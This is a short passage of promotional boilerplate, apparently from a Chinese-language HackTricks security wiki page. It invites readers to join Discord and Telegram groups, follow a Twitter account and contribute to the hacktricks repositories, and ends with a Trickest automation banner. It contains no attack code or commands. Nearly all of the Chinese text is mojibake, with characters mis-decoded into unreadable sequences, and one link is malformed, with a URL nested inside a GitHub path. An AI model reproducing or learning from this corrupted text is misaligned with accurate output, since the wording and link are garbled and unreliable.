* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
